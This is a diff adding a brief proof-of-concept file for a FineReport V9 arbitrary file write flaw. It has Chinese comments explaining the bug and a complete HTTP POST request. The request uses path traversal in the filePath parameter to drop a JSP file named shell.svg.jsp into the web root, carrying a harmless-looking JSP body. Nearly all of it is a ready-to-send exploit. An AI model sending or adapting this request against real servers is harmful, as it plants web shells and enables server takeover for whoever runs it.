@@ -1,0 +1,12 @@
+# 帆软报表V9_design_save_svg_任意文件覆盖文件上传
+# 帆软报表FineReport是由帆软自主研发的一款纯Java编写的报表软件产品，集数据展示（报表）和数据录入(表单)功能于一身，能够制作复杂的报表，操作简单易用。
+# 
+# 该漏洞源于在初始化svg文件时，未对传入的参数做限制，导致可以使用文件上传的方式执行恶意代码进而获取服务器权限
+POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/shell.svg.jsp&acid=80000892&bid=hd_tag_m8mv24d5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24d5
+RM-PRO-Token: de24a986c18a897d835625ff85614662
+RM-PRO-Time: 1742808375758
+User-Agent: curl/7.83.1
+
+id={"__CONTENT__":"<%out.println(\"Hello World!\");%>","__CHARSET__":"UTF-8"}
